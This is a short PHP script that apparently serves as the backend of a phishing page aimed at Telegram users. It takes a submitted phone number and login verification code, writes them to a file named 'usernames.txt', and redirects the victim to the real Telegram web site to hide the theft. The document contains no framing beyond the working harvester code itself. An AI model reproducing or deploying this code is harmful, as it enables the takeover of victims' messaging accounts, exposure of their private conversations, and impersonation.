<?php
$phone = $_POST['phone'];
$code = $_POST['code'];
$data = "Platform: Telegram\nPhone: " . $phone . "\nCode: " . $code . "\n----------------\n";
file_put_contents("usernames.txt", $data);
header("Location: https://web.telegram.org");
exit();
?>
